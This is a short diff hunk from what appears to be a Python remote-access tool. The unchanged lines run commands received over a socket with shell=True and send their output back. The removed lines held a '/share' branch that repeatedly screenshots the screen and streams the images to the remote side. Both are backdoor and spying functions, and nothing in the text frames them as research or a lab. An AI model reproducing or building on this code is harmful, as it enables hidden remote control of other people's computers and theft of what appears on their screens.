@@ -26,11 +26,3 @@ while True:
 		cmd_process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
 		cmd_process = cmd_process.stdout + cmd_process.stderr
 		s.send(cmd_process)
-	elif a == "/share":
-		while True:
-			image = pyautogui.screenshot()
-			image = image.resize((1366, 768), Image.ANTIALIAS)
-			image = np.array(image)
-			img = Image.frombytes('RGB', (1366, 768), image)
-			data = pickle.dumps(np.array(img))
-			s.sendall(struct.pack("L", len(data)) + data)
